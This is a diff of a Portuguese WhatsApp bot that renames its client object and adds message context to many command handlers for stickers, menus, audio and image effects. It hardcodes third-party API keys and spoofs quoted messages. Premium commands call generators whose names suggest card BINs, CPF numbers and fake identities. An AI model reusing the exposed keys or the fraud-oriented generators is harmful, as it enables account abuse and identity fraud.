-tomioka.sendMessage(from, fs.readFileSync('./assets/image.jpg'), MessageType.image, {quoted: ftoko, caption: imagens(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
+client.sendMessage(from, fs.readFileSync('./assets/image.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: imagens(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
 break
                 case 'especifico':
                 addFilter(from)
                       if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					     tomioka.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: ftoko, caption: especifico(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
+					     client.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: especifico(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
 			            break
 				case 'efeitos':
 				addFilter(from)
 				if (!isUser) return fakegroup(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-                tomioka.sendMessage(from, fs.readFileSync('./assets/efeito.jpg'), MessageType.image, {quoted: ftoko, caption: efeitoaudio(prefix), thumbnail: fs.readFileSync('./assets/efeito.jpg')})
+                client.sendMessage(from, fs.readFileSync('./assets/efeito.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: efeitoaudio(prefix), thumbnail: fs.readFileSync('./assets/efeito.jpg')})
 break
                 case 'premium':
                 addFilter(from)
                       if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					  tomioka.sendMessage(from, fs.readFileSync('./assets/premium.jpg'), MessageType.image, {quoted: ftoko, caption: premiuns(prefix), thumbnail: fs.readFileSync('./assets/premium.jpg')})
+					  client.sendMessage(from, fs.readFileSync('./assets/premium.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: premiuns(prefix), thumbnail: fs.readFileSync('./assets/premium.jpg')})
 				        break
                 case 'grupo':
                 addFilter(from)
                       if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					  tomioka.sendMessage(from, fs.readFileSync('./assets/adm.jpg'), MessageType.image, {quoted: ftoko, caption: grupo(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
+					  client.sendMessage(from, fs.readFileSync('./assets/adm.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: grupo(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
 						break
 /////////////////////
                          if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                          case 'mdono':
                          addFilter(from)
-					  tomioka.sendMessage(from, fs.readFileSync('./assets/dono.jpg'), MessageType.image, {quoted: ftoko, caption: dono(prefix), thumbnail: fs.readFileSync('./me.jpg')})
+					  client.sendMessage(from, fs.readFileSync('./assets/dono.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: dono(prefix), thumbnail: fs.readFileSync('./me.jpg')})
 					   break
                    case 'modapk':
                    addFilter(from)
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-                    tomioka.sendMessage(from, modapk(prefix), text, { quoted: ftoko, thumbnail: fs.readFileSync('./me.jpg') })
+                    client.sendMessage(from, modapk(prefix), text, { quoted: ftoko ,contextInfo: tomis, thumbnail: fs.readFileSync('./me.jpg') })
                     break
                    case 'gbin':
                    addFilter(from)
                     if (!isPremium) return fakegroup (mess.only.premium)
-                    tomioka.sendMessage(from, gbin(prefix), text, { contextInfo: null, quoted: ftoko})
+                    client.sendMessage(from, gbin(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     break
                    case 'gpessoa':
                    addFilter(from)
                    if (!isPremium) return fakegroup (mess.only.premium)
 				
-                    tomioka.sendMessage(from, gpessoa(prefix), text, { contextInfo: null, quoted: ftoko})
+                    client.sendMessage(from, gpessoa(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     break
                    case 'destrava':
                    addFilter(from)
                     
-                    tomioka.sendMessage(from, destrava(prefix), text, { contextInfo: null, quoted: ftoko})
-                    tomioka.sendMessage(from, destrava2(prefix), text, { contextInfo: null, quoted: ftoko})
-                    tomioka.sendMessage(from, destrava3(prefix), text, { contextInfo: null, quoted: ftoko})
+                    client.sendMessage(from, destrava(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
+                    client.sendMessage(from, destrava2(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
+                    client.sendMessage(from, destrava3(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     break
                    
                    case 'chentai':
                    addFilter(from)
                    if (!isPremium) return fakegroup (mess.only.premium)
 				
-                    tomioka.sendMessage(from, chentai(prefix), text, { contextInfo: null, quoted: ftoko})
+                    client.sendMessage(from, chentai(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     break
                    case 'gcpf':
                    addFilter(from)
                    if (!isPremium) return fakegroup (mess.only.premium)
 				
-                    tomioka.sendMessage(from, gcpf(prefix), text, { contextInfo: null, quoted: ftoko})
+                    client.sendMessage(from, gcpf(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     break
 				case 'ytmp4':
 				addFilter(from)
@@ -5587,9 +5075,9 @@ break
 					anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
 					teks = `*Title* : ${anu.title}`
 					thumb = await getBuffer(anu.thumb)
-					tomioka.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
+					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
 					buffer = await getBuffer(anu.result)
-					tomioka.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})
+					client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})
 					break
 case 'gay2':
 addFilter(from)
@@ -5598,7 +5086,7 @@ addFilter(from)
 
                 try {
 
-				ppimg = await tomioka.getProfilePicture(`${sender.split('@')[0]}@c.us`)
+				ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@c.us`)
 
 				} catch {
 
@@ -5616,7 +5104,7 @@ teks = `Você é ${random}% Gay\n\n${bo}`
 
                 gay = await getBuffer(`https://api-exteam.herokuapp.com/api/rainbow?img=${ppimg}`)
 
-               tomioka.sendMessage(from, gay, image, { quoted: mek, caption: teks})
+               client.sendMessage(from, gay, image, { quoted: mek, caption: teks})
 
 				break
 	
@@ -5714,7 +5202,7 @@ break
 					if (tels5.length > 10) return fakegroup ('O texto é longo, com até 10 caracteres')
 					return fakegroup (mess.wait)
 					buffer = await getBuffer(`https://api.vhtear.com/romancetext?text=${tels5}&apikey=ANTIGRATISNIHANJENKKK`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: tels5})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: tels5})
 					break
 				case 'water':
 				addFilter(from)
@@ -5724,7 +5212,7 @@ break
 					return fakegroup (mess.wait)
 					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tfire?text=${tels}&apikey=xptnbot352`, {method: 'get'})
 					buffer = await getBuffer(anu.result)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek})
+					client.sendMessage(from, buffer, image, {quoted: mek})
 					break
                  case 'nomegp':
                  addFilter(from)
@@ -5739,7 +5227,7 @@ addFilter(from)
 					var pin = JSON.parse(JSON.stringify(anu.result));
 					var trest =  pin[Math.floor(Math.random() * pin.length)];
 					pineq = await getBuffer(trest)
-					tomioka.sendMessage(from, pineq, image, { caption: '*Pinterest*\n\n*Resultado Pesquisa : '+pinte+'*', contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, pineq, image, { caption: '*Pinterest*\n\n*Resultado Pesquisa : '+pinte+'*', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 //_Figurinhas customizadas
                           
@@ -5751,14 +5239,14 @@ addFilter(from)
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         teks = `${anu.display_url}`
                         ranp = getRandom('.gif')
                         rano = getRandom('.webp')
                         anu8 = (`https://api-exteam.herokuapp.com/api/rip?img=${teks}`)
                         abc = await getBuffer(anu8)
-                        tomioka.sendMessage(from, abc, image, {
+                        client.sendMessage(from, abc, image, {
                             quoted: mek
                         })
                     } else {
@@ -5771,14 +5259,14 @@ addFilter(from)
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         teks = `${anu.display_url}`
                         ranp = getRandom('.gif')
                         rano = getRandom('.webp')
                         anu8 = (`https://api-exteam.herokuapp.com/api/hitler?img=${teks}`)
                         abc = await getBuffer(anu8)
-                        tomioka.sendMessage(from, abc, image, {
+                        client.sendMessage(from, abc, image, {
                             quoted: mek
                         })
                     } else {
@@ -5865,73 +5353,16 @@ case 'reversevid':
 if (!isQuotedVideo) return reply('Marque um vídeo')
 reply(mess.wait)
 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+media = await client.downloadAndSaveMediaMessage(encmedia)
 ran = getRandom('.mp4')
 exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) return reply(`Err: ${err}`)
 buffer453 = fs.readFileSync(ran)
-tomioka.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
+client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
 fs.unlinkSync(ran)
 })
-break
-/*case 'reiniciar':
-addFilter(from)  
-if (!isOwner) return reply(mess.only.ownerB)
-if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
-const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
-anu = args.join(' ').split('|')
-satu = anu[0] !== '' ? anu[0] : `YT`
-require('./lib/fetcher.js').createExif(satu)
-require('./lib/fetcher.js').modStick(media, tomioka, mek, from)
-rano = getRandom('.webp')
-reply('*「 ❗ 」 Espere só um pouquinho migo, está reiniciando...*')
-await ffmpeg(`./${media}`)
-.input(media)
-.on('start', function (cmd) {
-console.log(`Started : ${cmd}`)
-})
-.on('error', function (err) {
-console.log(`Error : ${err}`)
-exec(`webpmux -set exif ${addMetadata('bot','Bot')} ${rano} -o ${rano}`, async (error) => {
-fs.unlinkSync(media)
-reply(mess.stick)
-})
-})
-exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
-fs.unlinkSync(media)
-buffer = fs.readFileSync(rano)
-tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
-fs.unlinkSync(rano)
-})
-} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
-const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
-rano = getRandom('.webp')
-await ffmpeg(`./${media}`)
-.inputFormat(media.split('.')[1])
-.on('start', function (cmd) {
-console.log(`Started : ${cmd}`)
-})
-.on('error', function (err) {
-console.log(`Error : ${err}`)
-exec(`webpmux -set exif ${addMetadata('Bot', 'Ale')} ${rano} -o ${rano}`, async (error) => {
-fs.unlinkSync(media)
-tipe = media.endsWith('.mp4') ? 'video' : 'gif'
-reply(`Falha na conversão de ${tipe} para sticker`)
-})
-})
-exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
-fs.unlinkSync(media)
-buffer = fs.readFileSync(rano)
-tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
-fs.unlinkSync(rano)
-})
-} else {
-reply(`Você precisa enviar ou marcar uma imagem ou vídeo`)
-}
-break  */           
+break        
 case 'smeme': 
 case 'stickmeme':
 gh = body.slice(7)           
@@ -5940,7 +5371,7 @@ var bottom = gh.split('/')[1]
 var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
 ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
-owgi = await  tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await  client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9a7ea179fd1ce8bbe552fc1cb5ef122b", owgi)
 teks = `${anu.display_url}`
 ranp = getRandom('.gif')
@@ -5958,7 +5389,7 @@ break
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         imgtrg = `${anu.display_url}`
                         ranp = getRandom('.gif')
@@ -5968,7 +5399,7 @@ break
                             fs.unlinkSync(ranp)
                             if (err) return fakegroup (`DEU ERROR ??`)
                             nobg = fs.readFileSync(rano)
-                            tomioka.sendMessage(from, nobg, sticker, {
+                            client.sendMessage(from, nobg, sticker, {
                                 quoted: mek
                             })
                             fs.unlinkSync(rano)
@@ -5985,7 +5416,7 @@ break
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         imgtrg = `${anu.display_url}`
                         ranp = getRandom('.gif')
@@ -5995,7 +5426,7 @@ break
                             fs.unlinkSync(ranp)
                             if (err) return fakegroup (`DEU ERROR 😞`)
                             nobg = fs.readFileSync(rano)
-                            tomioka.sendMessage(from, nobg, sticker, {
+                            client.sendMessage(from, nobg, sticker, {
                                 quoted: mek
                             })
                             fs.unlinkSync(rano)
@@ -6013,9 +5444,9 @@ addFilter(from)
                         pru += `@${_.split('@')[0]}\n`
                     }
                     const shino = fs.readFileSync('./assets/tapa.mp4')
-                    tomioka.sendMessage(from, shino, MessageType.video, {
+                    client.sendMessage(from, shino, MessageType.video, {
                         mimetype: 'video/gif',
-                        quoted: ftoko,
+                        quoted: ftoko ,contextInfo: tomis,
                         caption: `Você acabou de dar um tapa na raba da😏 @${mentioned[0].split('@')[0]}`
                     })
                     break     
@@ -6026,7 +5457,7 @@ addFilter(from)
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         imgtrg = `${anu.display_url}`
                         ranp = getRandom('.gif')
@@ -6036,7 +5467,7 @@ addFilter(from)
                             fs.unlinkSync(ranp)
                             if (err) return fakegroup (`DEU ERROR 😞`)
                             nobg = fs.readFileSync(rano)
-                            tomioka.sendMessage(from, nobg, sticker, {
+                            client.sendMessage(from, nobg, sticker, {
                                 quoted: mek
                             })
                             fs.unlinkSync(rano)
@@ -6052,7 +5483,7 @@ addFilter(from)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/nature-3d?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '*prontinho*'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '*prontinho*'})
 					break
 case 'bot2':
 addFilter(from)
@@ -6069,7 +5500,7 @@ case 'lolkey':
 
               teks = `*SUA CHAVE API * \ n \ e➸ nome de usuário= ${anu.result.username}\n➸ Solicitar= ${anu.result.requests}\n➸ Hoje= ${anu.result.today}\n➸ tipo de conta= ${anu.result.account_type}\n➸ Expirado= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
 
-              tomioka.sendMessage(from, teks, text, {quoted: ftoko})
+              client.sendMessage(from, teks, text, {quoted: ftoko ,contextInfo: tomis})
 
               break
                       case 'joke':
@@ -6079,14 +5510,14 @@ case 'lolkey':
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         teks = `${anu.display_url}`
                         ranp = getRandom('.gif')
                         rano = getRandom('.webp')
                         anu8 = (`https://lolhuman.herokuapp.com/api/creator1/jokeOverHead?apikey=genbotkey&img=${teks}`)
                         abc = await getBuffer(anu8)
-                        tomioka.sendMessage(from, abc, image, {
+                        client.sendMessage(from, abc, image, {
                             quoted: mek
                         })
                     } else {
@@ -6100,14 +5531,14 @@ case 'lolkey':
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         teks = `${anu.display_url}`
                         ranp = getRandom('.gif')
                         rano = getRandom('.webp')
                         anu8 = (`https://lolhuman.herokuapp.com/api/creator1/facepalm?apikey=genbotkey&img=${teks}`)
                         abc = await getBuffer(anu8)
-                        tomioka.sendMessage(from, abc, image, {
+                        client.sendMessage(from, abc, image, {
                             quoted: mek
                         })
                     } else {
@@ -6121,14 +5552,14 @@ case 'lolkey':
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         teks = `${anu.display_url}`
                         ranp = getRandom('.gif')
                         rano = getRandom('.webp')
                         anu8 = (`https://lolhuman.herokuapp.com/api/creator1/beautiful?apikey=genbotkey&img=${teks}`)
                         abc = await getBuffer(anu8)
-                        tomioka.sendMessage(from, abc, image, {
+                        client.sendMessage(from, abc, image, {
                             quoted: mek
                         })
                     } else {
@@ -6142,14 +5573,14 @@ case 'lolkey':
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         teks = `${anu.display_url}`
                         ranp = getRandom('.gif')
                         rano = getRandom('.webp')
                         anu8 = (`https://lolhuman.herokuapp.com/api/creator1/affect?apikey=genbotkey&img=${teks}`)
                         abc = await getBuffer(anu8)
-                        tomioka.sendMessage(from, abc, image, {
+                        client.sendMessage(from, abc, image, {
                             quoted: mek
                         })
                     } else {
@@ -6158,13 +5589,13 @@ case 'lolkey':
                     break  
                     case 'flower':    
                     addFilter(from)
-                    if (!isPremium) return fakegroup (`Você não é um Membro Premium, entre em contato com o proprietário ou digite *${prefix}compras* para adquirir o acesso ` ,text, { contextInfo: null, quoted: ftoko})
+                    if (!isPremium) return fakegroup (`Você não é um Membro Premium, entre em contato com o proprietário ou digite *${prefix}compras* para adquirir o acesso ` ,text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					if (args.length < 1) return fakegroup (mess.blank)
 					teks = body.slice(8)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/flowertext?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
 					break
 case 'lighttxt':       
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -6173,7 +5604,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/glowtext?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
 					break                                                                    
                     case 'procurado':
                     		if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
@@ -6181,7 +5612,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         imgtrg = `${anu.display_url}`
                         ranp = getRandom('.gif')
@@ -6191,7 +5622,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                             fs.unlinkSync(ranp)
                             if (err) return fakegroup (`DEU ERROR 😞`)
                             nobg = fs.readFileSync(rano)
-                            tomioka.sendMessage(from, nobg, sticker, {
+                            client.sendMessage(from, nobg, sticker, {
                                 quoted: mek
                             })
                             fs.unlinkSync(rano)
@@ -6242,77 +5673,77 @@ case 'sound':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 enol = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound.mp3`)
-tomioka.sendMessage(from, enol, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, enol, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound1':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 satu = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound1.mp3`)
-tomioka.sendMessage(from, satu, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, satu, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound2':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 dua = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound2.mp3`)
-tomioka.sendMessage(from, dua, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, dua, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound3':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 tiga = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound3.mp3`)
-tomioka.sendMessage(from, tiga, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, tiga, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound4':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 empat = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound4.mp3`)
-tomioka.sendMessage(from, empat, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, empat, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound5':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 lima = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound5.mp3`)
-tomioka.sendMessage(from, lima, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, lima, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound6':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 enam = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound6.mp3`)
-tomioka.sendMessage(from, enam, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, enam, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound7':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 tujuh = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound7.mp3`)
-tomioka.sendMessage(from, tujuh, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, tujuh, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound8':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 lapan = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound8.mp3`)
-tomioka.sendMessage(from, lapan, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, lapan, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound9':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 bilan = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound9.mp3`)
-tomioka.sendMessage(from, bilan, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, bilan, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
 case 'sound10':
 addFilter(from)
 reply('Enviando audio tenha paciência e não mande muitas mensagens, pois irá falhar')
 puluh = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound10.mp3`)
-tomioka.sendMessage(from, puluh, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
+client.sendMessage(from, puluh, audio, { mimetype: 'audio/mp4', filename: `5544998220867.mp3`, quoted: mek})
 
 break
                 case 'wasted':
@@ -6322,7 +5753,7 @@ break
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                          return fakegroup (mess.wait)
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
                         imgtrg = `${anu.display_url}`
                         ranp = getRandom('.gif')
@@ -6332,7 +5763,7 @@ break
                             fs.unlinkSync(ranp)
                             if (err) return fakegroup (`DEU ERROR 😞`)
                             nobg = fs.readFileSync(rano)
-                            tomioka.sendMessage(from, nobg, sticker, {
+                            client.sendMessage(from, nobg, sticker, {
                                 quoted: mek
                             })
                             fs.unlinkSync(rano)
